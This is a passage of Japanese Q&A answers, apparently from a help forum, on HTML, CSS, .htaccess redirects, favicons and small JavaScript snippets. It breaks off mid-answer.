なかなか悩ましい問題ですね。 １つのサイトをレスポンシブデザインでコントロールして、アクセスデバイスがＰＣ、スマホ、タブレットかによって、レイアウトを変える方法が、作成者としてはやりやすいというか、手持ちの技術にちょっとプラスアルファするだけで対応可能に思えます。 ただ、一般の利用者の立場からすると、ブラウザによるアクセスよりも、スマホやタブレット用の専用アプリ、つまり、iOS、Andoroid、Windows Phoneそれぞに対応する専用アプリをAppStoreやGooglePlay、Windows ストアから提供してあげるほうが親切だと思えますし、今時の流れはこっちにあると思います。 ちょっと前までは、iOSならObjective-C、AndroidならJavaで開発することになったわけで、その敷居はかなり高く感じました。 でも、マイクロソフトがVisual Studio 2015から、Ｃ＃言語で、iPhone、Android、Windows Phoneのアプリ開発が可能になる環境を整えてくれました。 実際には、iOSの開発ではMacの環境が必要になったり、開発キットにそれなりの追加出費が必要となりますが、これまで使い慣れたＣ＃言語とVisual Studioでのアプリ開発が可能となれば、開発者としては手がずっと出しやすくなりました。 実際に、以前、ＮＨＫ紅白歌合戦で提供されたスマホアプリはＣ＃で開発されたものだそうです。
固定電話なら0ABCDEFGHJ 携帯電話なら0A0BCDEFGHJ で適当なところに「-」を挟んでおけばよい。
あ、どうやらdocument.fileSizeプロパティはIEの独自拡張でしたが、IE11以降は効かないようです。 https://developer.mozilla.org/en-US/docs/Web/API/document で、普通にページサイズ(htmlのファイルサイズ)を取得する場合はHttpヘッダーから取得してください。
スマートフォンでのfavicon表示にはrel属性に特別な値が必要になります。 また、用意する画像素材のサイズも様々なので下記のサイトを参考にしてください。 http://klutche.org/archives/1696/ http://calico.xyz/2015/02/06/apple-touch-icon/ http://bass-inu.hateblo.jp/entry/2015/02/06/123210 http://taken.jp/apple-touch-icon-on-android-ios.html
どちらの場合でも、コンセプトがはっきりしていていれば 特に気にならないですが、むしろ採用側として気になるのは、 なぜテンプレートサイトを作ろうと思ったのか、という動機部分と、 題材を選んだ背景なども気になります。 また汎用的でも、特定業種向けでも、 今のデザインの流行が表現できているかどうかは、かなり注視します。 あと面接官が私なら、で書きますと、 特定業種向けならば、流行をどういうプロセスで取り込んで生かしたか、 を自然と考えて作っているはずなので、面接の際にそうした話を聞きやすいです。 汎用的すぎると、逆に、流行のデザインいっぱい作ってきたんだな、となり、 どのくらい時間をかけたか？とか、（短納期で行ける人なのかな？）とか 採用側として、実践的な部分を重視した面接で終わってしまうかもしれません。 自分の得意な部分を見極めて、ＰＲしたい部分から、選んではいかがでしょうか。
>テンプレートサイトに使われる題材(業種)はあまり気にしなくてもいいものなのでしょうか？ 目的によります。 あなたの目的を明確にしてください。 また、テンプレートさいとの具体的なURLを提示してもらえれば、意に沿った回答をしやすいと思います。 >また調べてみたのですが、テンプレートサイトについていまいちよくわからなかった どのように調べたのかご説明下さい。 場合によっては調べ方を説明することで、回答では書ききれない情報やより分かりやすい情報を提供できる可能性があります。 いまいちわからなかったとは、逆に何ならわかったのでしょうか。
CSSの優先順位は 外部ファイルCSS　＜　<head>の記述　＜　インラインCSS になっていますから「<head>の記述」か「インラインCSS」で打ち消してあげると良いでしょう。 以下の例では、HEAD内で<A>タグを右寄せに指定していて、１番目と３番目の<A>タグは右寄せで、２番目の<A>タグはセンタリングしています。 <HTML> <HEAD> <STYLE type="text/css"> <!-- a { float: right; } --> </STYLE> </HEAD> <BODY> <A HREF="test.html"><IMG SRC="a.jpg"></A><BR> <A HREF="test.html" style="width: 100%; text-align: center; margin-left: auto;margin-right: aotu;"><IMG SRC="a.jpg"></A><BR> <A HREF="test.html"><IMG SRC="a.jpg"></A><BR> </BODY> </HTML> 結果は、以下のようになります。
タグが省略可能と、要素が省略可能は違いますから。 要素が省略可能と記述されているのは、head要素の解説中の ＞ Note: The title element is a required child in most situations, but when a higher-level protocol provides title information, e.g. in the Subject line of an e-mail when HTML is used as an e-mail authoring format, the title element can be omitted. の部分だけ、よって省略可能な要素はtitleということでしょう。
フォルダ（というかファイル）をPCに置かないでNASかWebサーバー上に置いて httpでフォルダにアクセスさせればよいかと。 （.htaccessでOptions +Indexes） フォルダ内のファイルを閲覧するだけじゃなくて、編集やコピー・削除も必要ってことなら、 公開フォルダのあるPCにWebDAV機能入れて、LANからはWebフォルダとして使えとか、 Pogoplug導入するとか。 ただ、クライアント側の設定の面倒をみる必要があるので、手間が多くなってしまいますので 私なら、手を抜いてファイル共有系のCGIを使うかな。 この場合、エクスプローラーから直接ファイルの操作はできなくて、FTPの操作みたいに CGI上で、アップロード/ダウンロード/コピー/削除のボタンを操作する感じになりますが。
Photoshopで最初からCMYKで製作していなければRGBはRGBのままです 印刷といってもこの場合は商業印刷するのではなくてインクジェットやレーザープリンターで印刷すると思われるのでRGBのままでいいです ご使用の環境ならjpgでもいいんじゃないですか
<html>は、HTMLのタグで、ドキュメントタイプ宣言では無いです。 なので、「ドキュメント宣言が無いとき」のバージョンになり、ブラウザ依存です。
＞（質問１） べつにXHTMLが必要というわけではありません。 ＞この文面からすると、ＨＴＭＬでも「従来のWebブラウザで問題なく見られる」と判断するのですが、 同じように、この文面から、「インターネットをはじめとしたオンラインでのデータの送受信にXMLが使用されることを想定し、HTML文書もXML処理系で統一的に扱える環境を整える必要があったことが挙げられている」という考えが過去にあったという風に理解してください。 ウェブサービス（Web API、Web2.0)で、使われるデータ形式は現在はJSON形式が主流ですが、そうなる前はXMLが主流になると考えられている時期がありました。 参考：https://ja.wikipedia.org/wiki/SOAP_%28%E3%83%97%E3%83%AD%E3%83%88%E3%82%B3%E3%83%AB%29 例えば、ブラウザ上のJavaScriptからHTTP通信を行う機能は、XMLHttpRequestですが、この名前にXMLと付いているのもその名残です。 ＞（質問２） 不都合なHTMLのサイト（HTMLの規格を守っていないサイト）はいくらでもありますが、 質問はおそらく、「HTMLの規格をきちんと守って書いても不都合が出るが、XHTMLで書き直せばその不都合が消えるサイトはあるか」という意図では無いかと思うので、そうであればそんなサイトはあり得ません。 ＞（質問３） 今後は、HTML5が主流になります。もうなりつつあります。
水平方向の結合ならcolspan属性、垂直方向ならrowspan属性で結合できます。 http://www.tagindex.com/html_tag/table/td_span.html 「html　セル結合」で検索すれば他にも見つかりますよ。 単に「セル結合」でやるとエクセルばかりでてきますね。
.htaccess に下記のように書くといいかと。 xyz.net内のページからのリンクのみOKで、それ以外のサイトからのリンクはNGにします。 ダイレクトもOKです。 SetEnvIf Referer "^http://xyz\.net/.*" ref_ok SetEnvIf Referer "^http.*" ref_ng order deny,allow deny from env=ref_ng allow from env=ref_ok
アイコン形式のファイル（拡張子ICO)に変換してください。 ICO形式以外は、ブラウザ依存です。あなたが参考にしたサイトにもちゃんと書いてありますよ。 ＞ファビコンで使用する画像は、ICO形式で作成するのが一般的です。（IEがこの画像形式にしか対応していないので） 「ico 変換」で検索すると変換してくれるサイトが見つかります。
autocomplete="off"
> 1. 最大解像度が2倍違うとモニターサイズが同じ大きさの場合、 > 　 文字の大きさも2倍になるのでしょうか？ 解像度が2倍大きいほうが、文字サイズが半分になります。 つまり解像度が大きければ全体的に小さく表示されます。 > 2. 一般的に、pxタグは、使わないでemや%を使った方が良いかどうか。 IE に限った話なのですが、IE9 よりも前のバージョンでは px で文字サイズを指定した場合にユーザ側で文字拡大できないという問題がありました。昔々は小さい文字がスタイリッシュとされて、ネコも杓子も 10px で作っていた時代があったのですが、10px では読めない人が続出して px ダメだ！ という流れになったのです。 IE10 以降はこの問題がなくなったので、今では px を忌避する理由は薄くなっていますね。 em はユーザが使用している OS によって大きさが変わるので、デザイン重視のページではなかなか難しい単位です (同じモニタでも OS が Windows か Mac かなどで変わるので、デザイン崩れの原因になりやすいです)。 % は元のサイズが Javascript などで動的に変わる場合などには便利なので、使えるときに上手く使えばいいんじゃない？ 程度ですね。 お好みで使えば良いのではないでしょうか？ > 3. remを使った場合、古いIEブラウザなど対応していない場合どうなるでしょうか。 単に無視されます。古いブラウザのサポートも考えるならば、一緒に px などの指定もしておくのが良いかと。 http://d.hatena.ne.jp/Syunpei/20120323/1332460739 > 4. rem は使わない方が良いのでしょうか 自分のサイトのユーザ層を考えて選択すれば良いかと。セキュリティ問題も無視して古いブラウザを使っているような老害はお呼びじゃないんだ！ というのであれば何の心配もいりません。 もしくは、3. で示した代替案を使うとか 。正直、2重指定するくらいなら、最初から古いブラウザにも対応できる単位で作ったほうが賢いでしょうが。
テーブルに対してというより、セルに対してpaddingしたいのでは？と思いました。 text-align: は継承されるプロパティなので、tableへの指定でも有効に見え、 padding:は継承されないプロパティなので、tableへの指定では効果なしに見えるのだと思います。 参考： http://www.tagindex.com/stylesheet/properties/ 以下、憶測へのアドバイスとなりますので、外していたらごめんなさい。 tdやthに直接指定すればいかがでしょうか？ table[summary="table_あ"] >td, table[summary="table_あ"] >th{ text-align: center; padding: 20px 0px; }
body{margin:0;} を加えてみてください。
> 変換先を経由するためにアクセスの参照は実際のアクセス地と異なる地名となるのでは 経由なんかしないのでそんなことは起こりません。 短縮URLサービスというのはHTTPリダイレクトを利用した物ですが、 リダイレクト（転送）の動作は 転送先URLを教えてもらって転送先に改めてアクセスし直すという物です。 つまり、 1. [アクセス元]→[短縮URL(転送)サービス] 2. [アクセス元]→[転送先サイト] という2回のアクセスが発生するだけです。
id はページ内で一意な値でなければいけないので、1つの要素に2つ付ける事は規約上無理です。 やるとしたらこんな感じでしょうか。 <div id="リンク先1"><div id="リンク先2">リンク先</div></div>
htmlタグにclass属性を勝手に追加するのはワードやエクセルの仕様ですね 何のためにやってるのかは知らないですけど 実害がなければそういうものだと思っておいてください
No.1の方の補足を拝見しました。 jsフォルダとcssフォルダは、サーバーに作成しましたか？
<div class="div_1 div_2">test</div> スペースあけて２つ書いてください。
そのご認識で合っていると思います。 ブラウザで「F5」キーや、更新ボタンを押して、表示中のページを更新してみてください。
ウェブサイト側の設定で、訪問済みの色を独自に設定しているからでしょう。
下記の URL のコメント「155. 匿名 2014/06/13(金) 16:40:53」にありますが、 質問者様の推測通りと思われます。 ＋10で大文字 ＋30で大文字pink http://girlschannel.net/topics/151584/
クエリーストリングは、RewriteRuleの対象外です。RewriteCondeで引っかけます。 RewriteCond %{QUERY_STRING} id=1$ RewriteRule ^category/test.php$ http://new.com/category/test.php?id=1 [R=301,L]
Searchという関数は何をする関数かを見てみてください。 その関数が何らかの理由で設計どうりに動いてないと思われます。
アクセス拒否はありますが、 アクセスさせる方法はないと思います。 下記を参考に google にクロール依頼をすることが手っ取り早いと思います。 ■ クローラーとは？「Googlebot」にクローリングさせたい場合とさせたくない場合の対処法 http://viral-community.com/seo/crawler-googlebot-2371/ ■ ちゃんとしたサイトがGoogleさんで正しく検索してもらえるようなSEO対策 http://vanidesign.blog.fc2.com/blog-entry-182.html ■ Google,Yahoo,Bingクローラーの巡回依頼の方法 http://amsstudio.jp/manual/others/crawler.html ■ 【初心者向け】Fetch as Googleの使い方！0.1秒でも早くサイトをクロールしてもらう！ http://whitebear-seo.com/fetchasgoogle-howto/ その他 Google クローラ関連 ■ クロール https://support.google.com/webmasters/topic/4589290?hl=ja&ref_topic=4558844&vid=0-635789108696936558-2820529705 ■ Google クローラ https://support.google.com/webmasters/answer/1061943?hl=ja ■ Googlebot https://support.google.com/webmasters/answer/182072?hl=ja ■ ウェブサイト用 Fetch as Google を使用する https://support.google.com/webmasters/answer/6066468?hl=ja
FC2を使ったことはありませんが……、公式サイトには下記のように書いてあります。条件つきで独自ドメイン利用可といったところでしょうか。ただし、ドメインの取得に際していろいろな制約があり、かつFC2ドメインは日本語に対応していないようなので、あまりお勧めできません。 　◆ホームページ作成に関して | Q&A | FC2ホームページヘルプ 　　http://help.fc2.com/web/qa/group38/141 　◆FC2ブログ | Q&A | FC2ブログヘルプ 　　http://help.fc2.com/blog/qa/group8/793 　◆FC2ドメイン | Q&A | FC2ドメインヘルプ 　　http://help.fc2.com/domain/qa/group119/359 もし一からホームページやブログをつくるのであれば、《さくら》や《ロリポップ》などのほうが使いやすいのではないでしょうか。さくらのドメインは日本語非対応、ムームー（ロリポップ）は日本語に対応しているようです。 　◆レンタルサーバー｜さくらインターネット - 無料お試し実施中 　　http://www.sakura.ne.jp/ 　◆独自ドメイン取得・管理 - レンタルサーバーはさくらインターネット 　　http://www.sakura.ne.jp/domain/ 　◆ロリポップ！レンタルサーバー | 期間限定キャンペーン実施中 　　http://lolipop.jp/ 　◆ドメイン取得は 【ムームードメイン】最安値77円！ 　　https://muumuu-domain.com/ なお、日本語ドメインはそれほど普及していないほか、メールアドレスに使いづらいといった欠点もあります。初めてのドメイン取得であれば、定番の《アルファベット》＋《.jp》《.com》《.net》にしておいたほうがトラブルも少ないと思いますよ。 　◆SEO対策に有利？覚えておきたい日本語ドメインのデメリット 　　http://tkbs.jp/guide/jpdomain-20140804/
「食べログの様に、携帯画面いっぱいにテーブルを作るにはどうすればいいでしょうか？」 　"width=100%"を指定すれば良いのでは？ 「食べログのスマホ版のコードの見方がわからない為どのようにしてつくられているのかわかりません。」 　urlを表示させて、PCでそのurlにアクセスして、ソースを見ることは出来ませんか？
先に述べられているとおり、 li　を使用する場合は、 <ul> <li>~~~~~~~~~~~</li> <li>~~~~~~~~~~~</li> </ul> または <ol> <li>~~~~~~~~~~~</li> <li>~~~~~~~~~~~</li> </ol> とする必要があります。 http://www.tohoho-web.com/html/li.htm ご質問の問題を解決するためには、 CSSで以下のように指定すると解決できます。 img { float: left; } li { clear: both; display: block; }
　ロカールであれば配置が間違ってなければそれでも表示されるでしょうが、サーバにアップロードする場合は基本的に日本語は使えませんし、大文字と小文字も別物として扱われます。
>そこでチャットルームの人数を入室前にひと目で分かるプログラムなどを書きたいと思っているのですが可能でしょうか。 サーバー側に、現在のチャットルームの人数を返送するプログラムを設置し、Ajaxでアクセスして取得すればできるでしょう。 >またこの場合ブラウザを何秒かに一回更新するようにプログラムを書くことによって最新の情報を取得できるのでしょうか。 Ajaxで定期的に情報を取得すればできるでしょう。 いずれも、サーバー側のプログラム設計がわからないと具体的な回答はできません。ただ、「そういうことが技術的に可能か？」といえば、「可能です」となりますね。
最初に書いたときに間違えてしまって、それがキャッシュされてしまい、修正したものが反映されないだけかも。 Firefoxのキャッシュをクリアしてみたらいかがでしょうか。
ブラウザのウィンドウサイズに合わせて、背景画像のサイズを調整したいということなら、CSSでやるのが楽だと思います。 http://webdesignrecipes.com/how-to-full-page-background-image-with-css-and-jquery/
>data-roleを使ってのスマホサイトの作成 これ、data-roleを使うってことは、要するにjquery mobileを使っての作成ってことでしょう。だとすると、jquery mobileを利用する場合、リスト（メニューページ）はulタグを多用しますから、自然と使うことが多くなります。 ただ、それはメニュー部分の訳で、メニューだけのサイトなんてありませんから、肝心のコンテンツのページは普通に作ることになるはずですよ。
HTMLだけではできません。 javascript を使えばできます。 もっともサーバ側は別々のスレッドで動くことになると思いますが。
こんにちわ。 HTMLソース画面上で右クリック→"ソースの整形" を選択すると 整形できると思いますがその方法ではダメでしょうか？
javascript を使ってください。例えばこんなふうに。 http://www.openspc2.org/reibun/javascript/form_textfield/016/
インターネット上のサイトに置いた HTML のリンクから、ローカルファイルを開くことは通常できません。なぜならば、これができてしまうと強力なウイルスが作成できてしまうためです。 もっとも、これはブラウザのセキュリティ設定で可能にすることはできます。例えば、IE ならば以下のページを参考にしてください。 http://mgate.info/computer/software/887/ ※ブラウザのセキュリティを低下させる操作なのでご注意を。 　あと、当然ですが自己責任で。
「ドックタイプ」です
display:inline; コレをしていしているので、DIVの意味が無くなっています。誤解を恐れず簡単に言えば、DIVの指定を無効にしているようなモノです。 なので、このinline指定を無くして、（か、或いはdivデフォルトの display : block ; とする） DIV右,DIV左{ float : left ; width : 任意のDIVの幅をpxや％等々で指定 ; } コレを加えてみてください。 こうすれば、質問者様の図のようにdivが左詰でfloatされます。 divは、デフォルトで横幅が100％の指定になっているので、この指定をし直してやらないと、float出来ないので注意です。 ※一度要素をフロートさせると、そのあとの内容も、フロートされた要素に続いて流れ込むことがあります。なので、HTML側に <div 右>～～～</div> <div 左>～～～</div> <div style="clear : both ;"></div> この最後の「<div style="clear : both ;"></div>」一行を入れることで、フロートがクリアされ、その後の行が、div右、div左の横に流れ込むのを解除します。（IEだとコレが無くても正常に表示されることもありますけど、他のブラウザで表示が崩れたりしますので注意）
の1さんの回答を見て、HTML5は違うの？ へえと思って調べてみたら、「コンテンツ・モデル」と言うモノらしいです。 難しいので、気の毒なので簡単に。 今までのxhtmlとかhtml4とかであれば、<a>タグの中（インライン要素）に<p>タグ（ブロック要素）を入れるのは、非常におかしな記述で、しかも間違った記述でした。 ちなみに、ブロック要素って言うのは、「サイドバーの塊全体の囲い」だとか「本文ブロックの塊全体の囲い」、そして、<p>「段落」のような、骨格部分、言葉そのもの「ウェブページのブロック的な部分」に当たる要素です。 インライン要素って言うのが、<a>をはじめ、<strong><span>など、文字に色をつけたり、文字を強調したりという、テキストに対する小さなまとまりのことです。 色つけのテキストのタグで、骨格のブロックを囲うというのは、かなり違和感があり、かつxhtmlやhtml4などの従来のHTMLでは、間違った記述になります。 まずは、HTML文書の一番最初の行の<DOCTYPE○○○>に注目してください。 <DOCTYPE html～～～DTD HTML 4.01～～～～> <DOCTYPE html～～～DTD XHTML 1.0～～～～> なんて書いてあったら、<a>等のインライン要素に<p>等のブロック要素を入れるのは間違った記述です。 ブラウザによっては、その部分が妙な表示になることもあります。 <!DOCTYPE html> こんな単純な記述であれば、そのHTML文書は「HTML5」です。 HTML5であれば、大丈夫みたいですね。 https://goo.gl/QndI31 ちなみに、xhtmlやhtml4で複数の文章をリンクで貼る場合は<br>タグで改行するのが無難です。 <br>は使いたくない、構文がどうの、等とうるさい人も中にはいますが、間違った記述ではありませんし、各ブラウザでも、思い通りに表示されると思います。 また、CSSがちょっと煩雑になりますが、<a>の中には<span>を入れることも出来ます。<span>と<br>で装飾すれば、構文違反にもならず、無難にある程度まではデザインできますよ。 CSS側で、<a>タグを「display:block;」しちゃえばもっと思い通りなカッコイイリンクが出来るかも。
jquery.mobile関係するのかな？！ css で　display: table-cell 　display: table　あたり使えば出来ると思います。 http://d.hatena.ne.jp/vividcode/20101117/1290003338
>フレームページが開かれるだけで 右窓は何が表示されているのでしょうか、単に右窓にBページを表示させるだけでいいような気がします。
一応、IT業界でWebシステムを作っていますが、「BEM、スマックス、OOCSS？ 何それ」 です。それなりに新しい技術にはアンテナを張っているつもりですが、私のアンテナには 引っかかってきませんでした。(CSS の規則に興味がないのもありますが) 私の意見としては、仕事をする上では重要とは言い難いです。ただ『その考え方』をきちん と納得して自分のモノにできれば、『自分の技術の引き出し』を豊かにしますので、無駄で はないでしょう（逆に丸暗記は何の役にも立ちません）。
1. ホームページのサーバに BASIC認証などの仕組みを組み込めば可能です。 2. 「ブラウザ画面全体に写真が表示され、写真をクリックすると次の写真が表示される」ような HTML を作ってください。写真1枚1枚に作るのは面倒ですが不可能ではないはずです。1枚1枚いちいち作るのなんて面倒だよ！ とおっしゃるならば、プログラムを覚えて頂いてそのようなシステムをご自分で作ることになります。 3. 右クリックにメニューにはそもそも「画像を保存」がありますが、それではなく「右クリックだけで保存できるようにしたい」と言うことでしょうか？ Javascript を覚えて頂いて、そのようなことができるプログラムを作れば可能です。 以上が大まかなやり方です。プログラムはわからないので(無料で)作ってください、とういうのは、虫が良すぎる、プログラマを馬鹿にした要求ですよ。自分で勉強するして何とかするか、お金を出して依頼するか、してください。
javasciprt を書いたページを http://～ または https://～ でアクセスしている場合はそのドメイン名を、file:///~ でアクセスしている場合は "javascriptのアラート" を表示しているのでしょう。
まず、「マークアップする」という表現とGoogleはなんの関係もないですね。マークアップは目印をつけていく、ぐらいの意味あいです。 ・誰への目印か？→おもにIEやクロームといったウェブブラウザ。 ・どんな目印を使うか？→HTML ・なぜ目印を使うか？→製作者（あなた）の意図通りにブラウザで表示してもらうため。 ・副産物→Googleなどのクローラも、そのサイトの有用性を判断するひとつの基準として同じ目印をみています。 といった関係ですね。
htmlファイルの内容を以下のようにしたらどうなりますか？ <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> <html lang="ja"> <head> <title>HTML 文書のサンプル</title> </head> <body> <p>Hello, World!</p> </body> </html>
そのソースのままいくなら、これしかないですね。 <style type="text/css"> body{ text-align:center; } p.mi{ display:inline; } </style> しかし、bodyにtext-align:center;なんて入れたら扱いにくい事この上ないです。 <div></div>で囲んでそのdivにtext-align:center;を入れるのが普通かと思います。 しかしそもそもなぜそんな中途半端な所で<p></p>を入れるのかよくわかりませんが、pとはparagraph（段落）の事ですので改行したくないなら<p></p>が適してるとは思い難いです。 ただ文中にクラスを付けたいだけならspanの方が良いでしょう。 <style type="text/css"> p{ text-align:center; } </style> </head> <body> <p><span class="mi">テキスト</span>あああ</p> </body>
スタイルシートで h2タグを指定します。 ちなみにh1 タグのスタイルはjquery-mobile の標準のCSSを読み込んでいるので、それが適用されているようですね。 これ→ <link rel="stylesheet" href="http://code.jquery.com/mobile/1.0a1/jquery.mobile-1.0a1.min.css" /> 例えばこんな感じでしょうか <style> h2 {background-color:blue; color: white} </style>
ご認識の通り、httpsでの通信は暗号化されるため、セキュリティが強固になります。 http://web-tan.forum.impressrd.jp/e/2015/06/19/20209 などにあるように、これからのwebはhttps化が進みます。 （httpの次世代規格であるhttp2は暗号化は必須です） Wilipediaとしては↓を見る限りでは改ざん防止の意味合いが強いのでしょうね。 https://blog.wikimedia.org/2015/06/12/securing-wikimedia-sites-with-https/
規模や構造によると思います。 規模が大きいと分業する事もありますし、部分的にデザイン変更がある場合など、要素ごとにまとめて書いた方が便利な事も多いです。 規模が小さかったりサイトマトリクスが単純な場合は、クエリごとにまとめた方がわかりやすいです。 今後という意味では、色々な方面からシステム化が進むと思うので、単純な構造はコーディングする事がなくなるかもしれません。 なので、要素ごとに書く機会の方が多くなるのかな、という気はします。 Media queries を日本語でメディアクエリー(メディアクエリ)と書いているので、メディアクエリーズという表現はあまり見ない気がします。
こんにちわ。 Socket.IOをどのように利用されるかわかりませんが、 Socket.IOの実行環境(Node.js or ブラウザのJavaSciprt)としてif分やSwitch分の利用に制限はないものと思います。
色づけしたいエリア（divなど）を入れ子にして、そこの色指定すればどうですか <html> <head> <title>test</title> <style type="text/css"> #area{ width: 400px; background-color:red; } #main{ width: 200px; background : none; } </style> </head> <body> <div id="area"> <div id="main"> test </div> </div> </body> </html> ではどうですか
先頭の html> が <html> のコピペミスだとするとHTMLにおかしな所はないです。 HTMLに書いたとおりに表示されているように見えます。 もし画像が表示されないというのが、あなたの考える問題点なら、そのhtmlと同階層にtop.jpgというファイルが無いためでしょう。 あと、HTML5 にするためには、1行目に下記が必要です。 <!DOCTYPE html>
手前味噌ですが、TSV -> table の変換スクリプトを過去に組みました。 http://thinkarc.blogspot.jp/2008/02/javascriptexceltable.html # Re: iloveokwebさん
何を問題と感じますか。 この文脈は、今日のおかず、というのと新着おかず、というのをならべて表現したいんですね。 そして、今日のおかずにおいしいおかず25という記事があるのです。 今日のおかずに、そのほかにいくつか記事を並べる場合もあるだろうし、この順に問題ないです。 もし、おいしいおかず、という記事があって、その中に天ぷら、刺身、煮物、なんてならべたくて下にsectionを置く書き方もあるでしょうね。 その場合はarticleの下にsectionの段が発生します。 概念構造の問題です。 別に文法が間違っているという指摘は当たりません。
@counter-style の prefix で部分的に実現可能ですが、扱えるブラウザはまだありません。 @counter-style を使っても prefix のインクリメント自動化は出来そうにないので大分類の数だけ @counter-style を定義してやる必要がありますが…。 http://www.w3.org/TR/css-counter-styles-3/ https://developer.mozilla.org/ja/docs/Web/CSS/@counter-style http://caniuse.com/#feat=css-at-counter-style どうしても HTML の構成を崩したくなければ、list-style-image で頑張ってください。 # Re: TZXHFCHENHさん
　《ブロック要素》と《インライン要素》の違いだと思います。基本的に、<p>や<div>などのブロック要素は改行され、<span>などのインライン要素は改行されません。 　理想通りにするには……、 　　◆タグを変えて、インライン要素のタグを使う 　　　<span>aaa</span><span>bbb</span> 　　　<span>aaa</span><span>bbb</span> 　　◆タグは変えずに、CSS側でブロック要素をインライン要素にする 　　　<p style="display: inline;">aaa</p><div style="display: inline;">bbb</div> 　　　<span>aaa</span><div style="display: inline;">bbb</div> などといった方法になってくるかと思います。
失礼しました、追記です。 2枚重ねるところまでで終わってしまっていて、ロールオーバー処理が丸々抜けていました。 以下のコードを追記してください。 追記する場所はどこでもいいです。 </p>の後ろあたりでも、一番最初でも大丈夫です。 <style> img[src="（平成２７年現在）.files/559e05ac002.gif"]:hover { opacity: 0; } </style>
そっくりコピーしてやってみたら、正常に動作しますよ。 書いてないのでわかりませんが、何か環境の問題ではないですか。 似たようなのがありましたので参考にしてみたらどうでしょう。 http://timeismoney.xyz/pg/js04.html
単に実現したいだけなら無料のメールフォームサービスを使ってiframeなりで載せてしまうというのもありではないでしょうか？ 知識ゼロから自分で作りたいとなると道のりは遠いですよ。
＞ すいませんが、具体的に、ネットワークタブのどの部分にどのような記載があると判断できるのでしょうか？ 再読み込みをすると、一連のアクセス情報が出ると思うので、ファイル欄が目的の物をクリックすると、右側に「応答ヘッダ」が出るので、その中に「Last-Modified」や「Etag」があると静的コンテンツの可能性が高いです。
>readonly checked なども同様だと推測しているのですがどうでしょう？ そうです。 readonly="readonly" もしくは readonly のみ と checked="checked" もしくは checked のみ です。 checked="true" もしくは checked="false" 等と書くとバカな人だと思われるので気をつけましょう。
spanタグは文章中に使うタグなので、そこだけ中央に寄せることができません。 無理やり文章中で中央寄せを表現する場合は、以下の書き方で恐らくできるはずです。 display: inline-block; width: 100%; text-align: center; pタグの中で使うのではなく、spanタグ単体で使うのであれば、display: block; の方がいいかもしれません。 それかdivやpなど、もともとblock要素のタグを使うかどちらかです。
CSSの仕様です。元から <tr> には "padding" が適用されません。 それ以外に、thead、tfoot、tbody、col、colgroup～にも適用できません。
まぁまずは「ブログ」はどこのサービスを使っているかを書いたほうがいいですね。 その上で、HTMLタグを書けるブログの場合、そのまま書くと改行などは認識されません。 以下のような文章は ------------------------------- 　こんにちは！ 　ここに文章を書きます 改行してみたりします。 ------------------------------- <p>こんにちは！</p><p>ここに文章を書きます<br />改行してみたりします。</p> ------------------------------- のようなタグで表現されます。 ご利用のブログのサービスによっては書き方はいろいろあると思います。
if (buff[0] == buff[1]) { のところです。 buff[0]が1の内容、buff[1]が2の内容が入ります。 1にyesの場合は if (buff[0] == "yes") { } 2にnoの場合は if (buff[1] == "no") { } となります。
この.htaccessをhttp://old.com/wp/である場所に置くのであれば RewriteEngine on RewriteBase /wp/ RewriteRule ^$ http://new.com/ [R=301,L] RewriteRule ^(.+)$ http://new.com/$1 [R=301,L] こうじゃないかな。RewriteBaseの/old.comが余計（要らない）。
何が目的かは分かりませんが、「制作者のエゴ」ではなく、「利用者の利便性向上」が目的ならば、ime-modeよりもまずは、html5から採用されているinput要素の属性値を正確に設定することをお勧めします。メールアドレスならtype="email"、数字限定ならtype="number"という感じです。それだけで、特にモバイル端末での利便性が飛躍します。
＆は&amp;にした方がいいのは、ソースをページに載せる場合でないの。
HTML ＋ JavaScript でつくるなら以下のような感じですかね ========== <!DOCTYPE html> <html lang='ja'> <head> <meta charset='UTF-8'> <title>サンプル</title> <script type="text/javascript"> var GetParam = {}; if(window.location.search.length > 1) { var query = window.location.search.substring(1); var parameters = query.split("&"); for(var i = 0; i < parameters.length; i++) { var element = parameters[i].split("="); var pName = decodeURIComponent(element[0]); var pValue = decodeURIComponent(element[1]); GetParam[pName] = pValue; } } function setMouseOver(elm) { switch (GetParam["id"]) { case "1": elm.src="./red.jpg"; break; case "2": elm.src="./green.jpg"; break; default: elm.src="./blue.jpg"; break; } } </script> </head> <body> <img style="width:100px;height:100px;" src="./black.jpg" onmouseover="setMouseOver(this);" onmouseout="this.src='./black.jpg'"> </body> </html> ==========
まず、規格が一番厳格であろうXHTML1.1で見てみると、閉じHTMLタグの後ろにLINKタグを置くのは完全にNGだ（そもそもXMLとして、文書1つにトップレベル要素が1つで他のタグは全部その中にないといけないっつーのがある）。 次にHTML5の規格だが、RFCとかにまとまっているわけではないので完全にOKともNGとも判断はできないが、HTMLはXML（というかSGML）のサブセットというのはHTML1.0の頃から変わっていないと思われるのでXMLと同様文法としては間違っていると断じざるを得ない。実際にw3cという組織が提供している文法チェックツールでも「場所おかしい」というエラーとなった。 ではLINKタグがHTMLタグの内側にあったらどうなのか。 ～～～～（１）～～～～ <html> <head> ～ <head> <body> ～ </body> <link hogehoge> </html> ～～～～～～～～ これだったらどうかだが、一応HTMLではHEADとBODYとコメントしか子要素にできないはずなのでこれもNG。じゃあBODYの中なら？ ～～～～（２）～～～～ <html> <head> ～ <head> <body> ～ <link hogehoge> </body> </html> ～～～～～～～～ これは、XHTML1.1的にはNG（XHTMLは各タグが出現できる箇所が厳密に決められていて、BODYタグの中にLINKタグは入れられない）だけど、HTML的にはどうなんだろうねぇ。根拠となる文書を探しきれなかった。 先ほどのw3cの文法チェッカーも、HTML4.01 transitionalだと「場所おかしい」エラーになるんだけど、HTML5としてチェックすると「属性が足りない」としか出てこないのでHTML5だとこの場所でもいいという事なのかも知れない。 さて、ブラウザの対応だが、ChromeはGoogle製なんだから対応していない（この書き方でCSSが読み込まれない）という事はまずないと思う。IEとFirefoxとOperaは分からないねー。まぁ、最後に処理したいスクリプトや外部ファイルはBODYタグの最後に書くのが現時点の対応ではベストではないでしょうか。 ただ、Googleがこう書くのは若干分かる。jQueryというJavaScriptライブラリーと組み合わせた際、ページを読み込んだら実行される処理の書き方に $("body").ready(function () { // hogehoge }); 